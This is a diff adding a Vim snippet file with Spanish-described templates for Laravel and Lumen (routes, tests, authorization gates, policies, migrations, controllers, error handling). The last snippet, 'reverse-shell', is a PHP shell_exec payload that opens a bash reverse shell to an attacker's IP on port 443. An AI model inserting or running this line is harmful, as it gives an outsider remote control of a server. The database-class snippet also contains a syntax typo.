@@ -1,0 +1,1021 @@
+###############################################################
+### Laravel - 8 ###
+###############################################################
+
+### RelationShips
+
+snippet oneToOne "Relación one to one"
+  //Get the ${1:model} associated with the model.
+  public function ${1:model}() {
+    return $this->hasOne(${1:Model}::class, 'FK_in_${1:Model}')->withDefault([
+        'name' => 'Guest Author',
+    ]);
+  }
+endsnippet
+
+
+### Routes
+snippet routerApiLaravel "Implementacion de las rutas API para Laravel"
+/*
+ * Version: 1.0.0   --   Path: api/v1.0.0/...
+ */
+Route::prefix('v1.0.0')->group( function () {
+
+	// 	Route: ${1:route}
+	//	Route::apiResource('${1:route}', ${2:controller})
+	Route::name('${1:route}.')->prefix('${1:route}')->group( function (){
+
+		Route::get('/', [${2:controller}::class, 'index']);
+
+		Route::post('/', [${2:controller}::class,'store']);
+
+		Route::get('/{id}', [${2:controller}::class, 'show']);
+
+		Route::put('/{id}', [${2:controller}::class, 'update']);
+
+		Route::delete('/{id}', [${2:controller}::class, 'destroy']);
+
+	});
+});
+endsnippet
+
+snippet routerResourceLaravel "Implementacion de las rutas RESOURCE para Laravel"
+/*
+ * Version: 1.0.0   --   Path: v1.0.0/...
+ */
+Route::prefix('v1.0.0')->group( function () {
+
+	//	Route: ${1:route}
+	//	Route::resource('${1:route}', ${2:controller}::class)
+	Route::prefix('${1:route}')->group( function (){
+
+		Route::get('/', [${2:controller}::class, '${1:route}.index']);
+
+		Route::get('/create', [ ${2:controller}::class, '${1:route}.create']);
+
+		Route::post('/', [${2:controller}::class, '${1:route}.store']);
+
+		Route::get('/{id}', [${2:controller}::class, '${1:route}.show']);
+
+		Route::get('/{id}/edit', [${2:controller}::class, '${1:route}.edit']);
+
+		Route::put('/{id}', [${2:controller}::class, '${1:route}.update']);
+
+		Route::delete('/{id}', [${2:controller}::class, '${1:route}.destroy']);
+
+	});
+});
+endsnippet
+
+snippet resourceRoute "Crea una ruta resource"
+Route::resource('photos', PhotoController::class)->only(['index', 'show']);
+endsnippet
+
+################
+#### Testing ###
+################
+snippet testFirst "Crea un primer test, y agrega el trait RefreshDatabase"
+use RefreshDatabase;
+
+/** @test */
+function ${1:check_feature}()
+{
+	$this->withoutExceptionHandling();
+	$0
+}
+endsnippet
+
+snippet test "Crea un nuevo test, opcional usar el trait (use RefreshDatabase)"
+/**
+ * 1. GIVEN:
+ * 2. WHEN:
+ * 3. THEN:
+ *
+ * @test
+ */
+
+function ${1:check_feature}()
+{
+	$this->withoutExceptionHandling();
+
+	$response = $this->get('/');
+  $response->assertStatus(200);
+	$0
+}
+endsnippet
+
+snippet factoryUser "Crea un usuario falso y crea una session falsa para poder usarlo"
+$user = User::factory()->create();
+
+$this->actingAs($user)
+	->get(route('home.index'))
+	->assertStatus(200);
+endsnippet
+
+###############################################################
+### Laravel - Custom ###
+###############################################################
+
+snippet storage:file "Guarda un archivo en src/storage/app/private"
+$name_file = $request->file("file")->getClientOriginalName();
+$new_name = now() . "-" . Auth::user()->id . "-" . $name_file;
+
+Storage::disk("local")->putFileAs(
+	"private/",
+	$request->file("file"),
+	$new_name
+);
+endsnippet
+
+snippet regExp "Valida si un string cumple con un regExp"
+$message=${1:"Message validate"};
+$regExp="^[a-z]"
+
+if (!preg_match($regExp, $message, $matches, PREG_OFFSET_CAPTURE)){
+	echo "Message incorrect";
+	return false;
+
+} else {
+	echo "Message correct";
+	print_r($matches[1]);
+}
+endsnippet
+
+snippet decrypt "Decifra un string"
+try {
+	$decrypted = Crypt::decryptString($encryptedValue);
+} catch (DecryptException $e) {
+	//
+}
+endsnippet
+
+snippet auth:check "Verifica si el usuario actual esta registrado"
+if (Auth::check()) {
+	return Redirect::to("${1:home}");
+}
+endsnippet
+
+snippet redirect:back "Redirecciona a la url anterior con un mensaje"
+Redirect::back()->with('status','${1:Message content}');
+endsnippet
+
+snippet encrypt "Encripta un string"
+Crypt::encryptString(\$${1:request->token})
+endsnippet
+
+snippet ifUserAuth "Permite una accion si el usuario esta autentificado"
+if (Auth::check()) {
+	// The user is logged in...
+}
+endsnippet
+
+snippet Gate::authorize "Verifica si el usuario puede realizar una accion, de lo contrario devuelve AuthorizationException que se convierte en un error 403"
+Gate::authorize('update-${1:post}', \$${1:post});
+endsnippet
+
+snippet Gate::inspect "Retorna una respuesta de autorizacion completa, se debe usar si en la Policy retorna una respuesta completa con Illuminate\Auth\Access\Response"
+$response = Gate::inspect('update-${1:post}', \$${1:post});
+
+if ($response->allowed()) {
+	// The action is authorized...
+} else {
+	echo $response->message();
+}
+endsnippet
+
+snippet Gate::after "after para define un callback que será ejecutado luego de todas las Policies, si el callback retorna un resultado que no sea null, dicho resultado será considerado el resultado de la comprobación."
+Gate::after(function ($user, $ability, $result, $arguments) {
+	if ($user->isSuperAdmin()) {
+		return true;
+	}
+});
+endsnippet
+
+snippet Gate::before "Before define un callback que se ejecuta antes de todas las Policies, si el callback retorna un resultado que no es null, dicho resultado será considerado el resultado de la comprobación."
+Gate::before(function ($user, $ability) {
+	if ($user->isSuperAdmin()) {
+		return true;
+	}
+});
+endsnippet
+
+snippet Gate::any "Determina si el usuario actual puede realizar alguna accion"
+if (Gate::any(['update-${1:post}', 'delete-${1:post}'], \$${1:post})) {
+	${3:// The user can update or delete the post}
+}
+endsnippet
+
+snippet Gate::none "Determina si el usuario actual no puede realizar ninguna de las acciones"
+if (Gate::none(['update-${1:post}', 'delete-${1:post}'], \$${1:post})) {
+	${3:// The user cannot update or delete the post}
+}
+endsnippet
+
+snippet Gate::denies "Determina si el usuario actual no tiene permisos para ejecutar una accion"
+if (Gate::denies('${1:update-post}', \$${2:post})) {
+	${3:// The current user can't update the post...}
+}
+endsnippet
+
+snippet Gate::allow "Determina si el usuario actual tiene permiso para ejecutar una accion"
+if (Gate::allows('${1:update-post}', \$${2:post})) {
+	${3:// The current user can update the post..}
+}
+endsnippet
+
+snippet Gate::define "Define un policy en el metodo boot del AuthServiceProvider"
+Gate::define('${1:update-post}', 'App\Policies\${2:CustomPolicy@update}');
+endsnippet
+
+snippet Gate:forUserCan "Determine si un usuario en especifico, tiene permiso para realizar una accion"
+if (Gate::forUser(\$user)->allows('${1:update-post}', \$${2:post)}) {
+	${3:// The user can update the post...}
+}
+endsnippet
+
+snippet Gate::forUserCanNot "Determine si un usuario en particular, no tiene permiso para realizar una accion"
+if (Gate::forUser(\$user)->denies('${1:update-post}', \$${2:post})) {
+	${3:// The user can't update the post...}
+}
+endsnippet
+
+snippet dataBaseConnection "Clase para conectarse a una base de datos en PHP"
+<?php
+
+class Database{
+
+    private $host;
+    private $db;
+    private $user;
+    private $password;
+    private $charset;
+
+    public function __construct(){
+        $this->host = constant('HOST');
+        $this->db = constant('DB');
+        $this->user = constant('USER');
+        $this->password = constant('PASSWORD');
+        $this->charset = constant('CHARSET');
+    }
+
+    function connect(){
+        try{
+            $connection = "mysql:host=" . $this->host . ";dbname=" . $this->db . ";charset=" . $this-<>charset;
+            $options = [
+                PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
+                PDO::ATTR_EMULATE_PREPARES   => false,
+            ];
+
+            $pdo = new PDO($connection, $this->user, $this->password, $options);
+
+            return $pdo;
+        }catch(PDOException $e){
+            print_r('Error connection: ' . $e->getMessage());
+        }
+    }
+
+}
+
+?>
+endsnippet
+
+
+###############################################################
+### Lumen - Artisan ###
+###############################################################
+
+snippet policyLumen "Las políticas organizan la lógica de autorización en torno a un modelo o recurso en particular. Por ejemplo, si tu aplicación es un blog, es posible que tengas un Postmodelo y un correspondiente PostPolicy para autorizar acciones del usuario como crear o actualizar publicaciones."
+namespace App\Policies;
+
+use App\Models\\${1/\w+/\u$0/g:Model};
+use App\Models\User;
+
+class `!p snip.rv = snip.basename or "untitled"`
+{
+
+	/**
+		* Determine whether the user can view any models.
+		*
+		* @param  App\Models\User  $user
+		* @return Boolean
+		*/
+	public function viewAny(User $user)
+	{
+		//
+	}
+
+   /**
+     * Determine whether the user can view the model.
+     *
+     * @param  App\Models\User  $user
+     * @param  App\Models\\${1/\w+/\u$0/g:Model}  ${1:model}
+     * @return Boolean
+     */
+    public function view(User $user, ${1/\w+/\u$0/g:Model} ${1:model})
+    {
+       //
+    }
+
+   /**
+     * Determine whether the user can create models.
+     *
+     * @param  App\Models\User   $user
+     * @return Boolean
+     */
+    public function create(User $user)
+    {
+       //
+    }
+
+   /**
+     * Determine whether the user can update the model.
+     *
+     * @param  App\Models\User   $user
+     * @param  App\Models\\${1/\w+/\u$0/g:Model}  ${1:model}
+     * @return Boolean
+     */
+    public function update(User $user,${1/\w+/\u$0/g:Model} ${1:model})
+    {
+       //
+    }
+
+   /**
+     * Determine whether the user can delete the model.
+     *
+     * @param  App\Models\User $user
+     * @param  App\Models\\${1/\w+/\u$0/g:Model}  ${1:model}
+     * @return Boolean
+     */
+    public function delete(User $user,${1/\w+/\u$0/g:Model} ${1:model})
+    {
+       //
+    }
+
+   /**
+     * Determine whether the user can restore the model.
+     *
+     * @param  App\Models\User  $user
+     * @param  App\Models\\${1/\w+/\u$0/g:Model}  ${1:model}
+     * @return Boolean
+     */
+    public function restore(User $user,${1/\w+/\u$0/g:Model} ${1:model})
+    {
+       //
+    }
+
+   /**
+     * Determine whether the user can permanently delete the model.
+     *
+     * @param  App\Models\User  $user
+     * @param  App\Models\\${1/\w+/\u$0/g:Model}  ${1:model}
+     * @return Boolean
+     */
+    public function forceDelete(User $user,${1/\w+/\u$0/g:Model} ${1:model})
+    {
+       //
+    }
+}
+endsnippet
+
+snippet repositoryLumen "Clase repository para abstraer la logica de consultas SQL en Lumen"
+namespace App\Repositories;
+
+use App\Models\\${1/\w+/\u$0/g:Model};
+
+class `!p snip.rv = snip.basename or "untitled"`
+{
+
+    protected ${1:model};
+
+    /**
+     * `!p snip.rv = snip.basename or "untitled"` constructor.
+     *
+     * @param ${1/\w+/\u$0/g:Model} ${1:model}
+     */
+    public function __construct(${1/\w+/\u$0/g:Model} ${1:model})
+    {
+        $this->${1:model} = ${1:model};
+    }
+
+    public function all()
+    {
+        //
+    }
+
+    public function create(array $data)
+    {
+        //
+    }
+    public function update(array $data,int $id)
+    {
+        //
+    }
+
+    public function delete(int $id)
+    {
+       //
+    }
+
+    public function find(int $id)
+    {
+       //
+    }
+
+}
+endsnippet
+
+
+snippet responseTraitLumen "Trait para establecer una respuesta estandar en caso de exito o error en los controladores"
+namespace App\Traits;
+
+trait `!p snip.rv = snip.basename or "untitled"`
+{
+
+   /**
+     * Return a response on success
+     * @param String $type
+     * @param Object $data
+     * @param Int $code
+     * @return Response
+     */
+    public function successResponse(String $type="success", $data, int $code = 200)
+    {
+        return response()->json([
+            "data" => [
+                   ["type" => $type, "attributes" => [$data] ]
+           ]
+       ], $code);
+    }
+
+   /**
+     * Return a response on error
+     * @param String $message
+     * @param Int $code
+     * @return Response
+     */
+    public function errorResponse(String $message="error", int $code = 400)
+    {
+        return response()->json([
+            "errors" => [
+                   [ "status" => $code, "title" => $message  ]
+           ]
+       ], $code);
+    }
+
+}
+endsnippet
+
+
+snippet middlewareLumen "Middleware basico para Lumen"
+namespace App\Http\Middleware;
+
+use Closure;
+
+class `!p snip.rv = snip.basename or "untitled"`
+{
+
+   /**
+     * Handle an incoming request.
+     *
+     * @param  Illuminate\Http\Request  $request
+     * @param  Closure  $next
+     * @return mixed
+     */
+    public function handle($request, Closure $next, ...$params)
+    {
+        $params = array_slice(func_get_args(), 2);
+        return $next($request);
+    }
+
+}
+endsnippet
+
+
+snippet userForRolesLumen "Metodos para controlar los roles en un usuario, se agregan dentro del Model App\Models\User"
+/**
+ * Add this method to the Role model
+ * public function users()
+ * {
+ *    return $this->belongsToMany(User::class)->withTimestamps();
+ * }
+ */
+
+/**
+ * When creating a user, assign a default role ("user") after creating it
+ * $user->roles()->attach(Role::where("name", "user")->first());
+ */
+
+/**
+ * Associate a user with a role, using the pivot table
+ * @return App\Models\Role
+ */
+public function roles()
+{
+    return $this->belongsToMany(Role::class)->withTimestamps();
+}
+
+/**
+ * Check if the user has a role and is authorized to perform an action
+ * @param String $role OR @param Array $roles
+ * @return Boolean
+ */
+public function authorizeRoles($roles)
+{
+    if(!$this->hasAnyRole($roles)){
+        throw new AuthorizationException("This action is unauthorized.", 403);
+   };
+    return true;
+}
+
+/**
+ *  Check if the user has an associated role
+ *  @param String $role OR @param Array $roles
+ *  @return Boolean
+ */
+public function hasAnyRole($roles)
+{
+    if(is_array($roles)) {
+        foreach ($roles as $role) {
+            if ($this->hasRole($role)) {
+                return true;
+           }
+       }
+    }else{
+        if($this->hasRole($roles)) {
+            return true;
+       }
+   }
+    return false;
+}
+
+/**
+  *  Check if the user has the assigned role
+  * @param String $role
+  * @return Boolean
+  */
+ public function hasRole(String $role)
+ {
+
+     if($this->roles()->where("name", $role)->first()){
+         return true;
+           }
+     return false;
+ }
+endsnippet
+
+snippet rolesMigrationLumen "Clase Migration con las tablas listas para crear roles en Lumen"
+use Illuminate\Database\Migrations\Migration;
+use Illuminate\Database\Schema\Blueprint;
+use Illuminate\Support\Facades\Schema;
+
+class `!p snip.rv = snip.basename or "untitled"` extends Migration
+{
+
+   /**
+     * Run the migrations.
+     *
+     * @return void
+     */
+    public function up()
+    {
+        Schema::create("roles", function (Blueprint $table) {
+           $table->id();
+           $table->string("name");
+           $table->string("description");
+           $table->timestamps();
+       });
+
+        Schema::create("role_user", function (Blueprint $table) {
+           $table->id();
+           $table->unsignedBigInteger("role_id");
+           $table->unsignedBigInteger("user_id");
+           $table->timestamps();
+           $table->foreign("role_id")
+                ->references("id")
+                ->on("roles")
+                ->onDelete("cascade");
+           $table->foreign("user_id")
+                ->references("id")
+                ->on("users")
+                ->onDelete("cascade");
+       });
+   }
+
+   /**
+     * Reverse the migrations.
+     *
+     * @return void
+     */
+    public function down()
+    {
+        Schema::dropIfExists("roles");
+        Schema::dropIfExists("role_user");
+    }
+
+}
+endsnippet
+
+snippet classPhp "Clase basica para PHP"
+namespace ${1:Namespace};
+
+class `!p snip.rv = snip.basename or "untitled"`
+{
+
+    public function __construct()
+    {
+
+    }
+
+}
+endsnippet
+
+snippet seedLumen "Clase semilla para Lumen"
+namespace Database\Seeders;
+
+use App\Models\\${1/\w+/\u$0/g:Model};
+use Illuminate\Database\Seeder;
+
+class `!p snip.rv = snip.basename or "untitled"` extends Seeder
+{
+
+   // Run the database seeds.
+   // @return void
+    public function run()
+    {
+
+        ${1/\w+/\u$0/g:Model}::factory(50)->create();
+   }
+
+}
+endsnippet
+
+snippet lumenFactory "Clase factory para Lumen"
+namespace Database\Factories;
+
+use App\Models\\${1/\w+/\u$0/g:Model};
+use Illuminate\Database\Eloquent\Factories\Factory;
+
+class `!p snip.rv = snip.basename or "untitled"` extends Factory
+{
+
+    /**
+     * The name of the factory"s corresponding model.
+     *
+     * @var string
+     */
+
+    protected $model = ${1/\w+/\u$0/g:Model}::class;
+
+    /**
+     * Define the model"s default state.
+     *
+     * @return array
+     */
+
+    public function definition()
+    {
+
+        return [
+            //"name" => $this->faker->name,
+            //"email" => $this->faker->unique()->safeEmail,
+       ];
+   }
+
+}
+endsnippet
+
+snippet eventLumen "Clase Event para Lumen"
+namespace App\Events;
+
+use App\Models\\${1/\w+/\u$0/g:Model};
+use Illuminate\Broadcasting\InteractsWithSockets;
+use Illuminate\Queue\SerializesModels;
+
+class `!p snip.rv = snip.basename or "untitled"`
+{
+
+      use  InteractsWithSockets, SerializesModels;
+
+     public ${1:model};
+
+     /**
+      * Create a new event instance.
+      *
+      * @param  \App\Models\\${1/\w+/\u$0/g:Model}  ${1:model}
+      * @return void
+      */
+
+     public function __construct(${1/\w+/\u$0/g:Model} ${1:model})
+     {
+
+         $this->${1:model} = ${1:model};
+
+     }
+}
+endsnippet
+
+snippet modelLumen "Clase Model para Lumen"
+namespace App\Models;
+
+use Illuminate\Database\Eloquent\Model;
+
+class `!p snip.rv = snip.basename or "untitled"` extends Model
+{
+
+	// protected $guarded = [];
+
+	// protected $fillable = [];
+
+	// protected $table = "`!p snip.rv = snip.basename or "untitled"`";
+
+	// protected $primaryKey = "`!p snip.rv = snip.basename or "untitled"`_id";
+
+	// public $timestamps = false;
+
+}
+endsnippet
+
+snippet validatorLumen "Class Validator para Lumen"
+namespace App\Validator;
+
+use Illuminate\Http\JsonResponse;
+use Illuminate\Http\Request;
+use Illuminate\Validation\ValidationException;
+use Illuminate\Support\Facades\Validator;
+
+class `!p snip.rv = snip.basename or "untitled"`
+{
+
+    public function __construct(Request $request)
+    {
+        $this->request = $request;
+    }
+
+/**
+  *  Validate the request depending on the rules, if it is fulfilled it returns
+  *  only the correct fields, otherwise it returns an exception
+  *
+  *  @return Array $validate
+  */
+    public function validate()
+    {
+
+        $validator = Validator::make(
+            $this->request->all(),
+            $this->rules(),
+            $this->messages()
+        );
+
+        if ($validator->fails()) {
+            throw new ValidationException(
+               $validator,
+               new JsonResponse($validator->errors()->getMessages(),422)
+            );
+        }
+
+        return $validator->validateWithBag("post");
+        //$validate = $this->validator->validate();
+    }
+
+    public function rules()
+    {
+        return [
+              //"email" => ["required", "email", "unique:users,email," . $this->request->id]
+              //"email.required" => "The :attribute field is required.",
+        ];
+    }
+
+    public function messages()
+    {
+
+        return [
+              //"email.unique" => "The :attribute has already been taken.",
+        ];
+    }
+}
+endsnippet
+
+snippet routerLumen "Implementacion de las rutas API para Lumen"
+//Version: 1.0.0   --   Path: api/v1/...
+$app->group(['prefix' => 'v1.0.0'], function () use ($router) {
+
+     //Route: ${1:route}
+     $app->group(['prefix' => '${1:route}'], function () use ($app) {
+
+         $app->get('/', [
+             'uses' => '${2:controller}@index',
+             'as' => '${1:route}.index'
+          ]);
+
+         $app->post('/', [
+             'uses' => '${2:controller}@store',
+             'as' => '${1:route}.store'
+          ]);
+
+         $app->get('/{id}', [
+             'uses' => '${2:controller}@show',
+             'as' => '${1:route}.show'
+          ]);
+
+         $app->put('/{id}', [
+             'uses' => '${2:controller}@update',
+             'as' => '${1:route}.update'
+          ]);
+
+         $app->delete('/{id}', [
+             'uses' => '${2:controller}@destroy',
+             'as' => '${1:route}.destroy'
+          ]);
+
+    });
+});
+endsnippet
+
+snippet controllerLumen "Controlador para las rutas api de Lumen"
+namespace App\Http\Controllers;
+
+use Illuminate\Support\Facades\Hash;
+use Illuminate\Http\Request;
+use Illuminate\Http\Response;
+
+class `!p snip.rv = snip.basename or "untitled"` extends Controller
+{
+
+    /**
+      * @param  \Illuminate\Http\Response  $response
+      */
+     public function __construct(Response $response)
+     {
+       $this->response = $response;
+     }
+
+    /**
+     * Display a listing of the resource.
+     *
+     * @return \Illuminate\Http\Response
+     */
+    public function index()
+    {
+       //
+    }
+
+    /**
+     * Store a newly created resource in storage.
+     *
+     * @param  \Illuminate\Http\Request  $request
+     * @return \Illuminate\Http\Response
+     */
+    public function store(Request $request)
+    {
+       //
+    }
+
+    /**
+     * Display the specified resource.
+     *
+     * @param  int  $id
+     * @return \Illuminate\Http\Response
+     */
+    public function show(int $id)
+    {
+       //
+    }
+
+    /**
+     * Update the specified resource in storage.
+     *
+     * @param  \Illuminate\Http\Request  $request
+     * @param  int  $id
+     * @return \Illuminate\Http\Response
+     */
+    public function update(Request $request,int $id)
+    {
+       //
+    }
+
+    /**
+     * Remove the specified resource from storage.
+     *
+     * @param  int  $id
+     * @return \Illuminate\Http\Response
+     */
+    public function destroy(int $id)
+    {
+       //
+    }
+
+}
+endsnippet
+
+snippet exceptionLumen "Excepciones para controlar los errores en el metodo Handle"
+//use Illuminate\Auth\Access\AuthorizationException;
+//use Illuminate\Database\Eloquent\ModelNotFoundException;
+//use Illuminate\Database\QueryException;
+//use Illuminate\Validation\ValidationException;
+//use Symfony\Component\HttpFoundation\File\Exception\FileNotFoundException;
+//use Symfony\Component\HttpKernel\Exception\HttpException;
+if ($exception instanceof FileNotFoundException) {
+return response()->json([
+    "errors" => [
+           [
+            "status" => 404,
+            "title" => "Resource error not found",
+            "details" => $exception->getMessage()
+           ]
+       ]
+   ],
+   404);
+}
+
+if ($exception instanceof ModelNotFoundException) {
+    $model = strtolower(class_basename($exception->getModel()));
+    return response()->json([
+        "errors" => [
+            [
+                "status" => 404,
+                "title" => "Model error "  . $model,
+                "details" => $exception->getMessage()
+             ]
+         ]
+    ], 404);
+}
+
+if ($exception instanceof QueryException) {
+    return response()->json([
+        "errors" => [
+            [
+               "status" => 500,
+                "title" => "BD query error ",
+                "details" => $exception->getMessage()
+             ]
+         ]
+    ], 500);
+}
+
+if ($exception instanceof HttpException) {
+    return response()->json([
+        "errors" => [
+            [
+                "status" => $exception->getStatusCode(),
+                "title" => "Path error, not found ",
+                "details" => $exception->getMessage()
+             ]
+         ]
+    ], $exception->getStatusCode());
+}
+
+if ($exception instanceof AuthenticationException) {
+    return response()->json([
+        "errors" => [
+            [
+                "status" => 401,
+                "title" => "Authentication Error",
+                "details" => $exception->getMessage()
+             ]
+         ]
+    ], 401);
+}
+if ($exception instanceof AuthorizationException) {
+    return response()->json([
+        "errors" => [
+            [
+                 "status" => 403,
+                 "title" => "Authorization Error",
+                 "details" => $exception->getMessage()
+            ]
+        ]
+    ], 403);
+ }
+
+if ($exception instanceof ValidationException) {
+    return response()->json([
+        "errors" => [
+            [
+                 "status" => $exception->status,
+                 "title" => "Validation Error",
+                 "details" => $exception->validator->errors()->getMessages()
+            ]
+        ]
+    ], $exception->status);
+}
+
+if (env("APP_DEBUG")) {
+    return parent::render($request, $exception);
+}
+return response()->json([
+    "errors" => [
+        [
+             "status" => 500,
+             "title" => "Unexpected error. Try later",
+             "details" => $exception->getMessage()
+        ]
+    ]
+], 500);
+endsnippet
+
+
+
+## PHP Vanilla
+snippet reverse-shell "Ejecuta una reverse-shell desde la maquina victima al puerto 443 del atacante"
+shell_exec("bash -c 'bash -i >& /dev/tcp/${1:10.10.10.121}/443 0>&1'")
+endsnippet
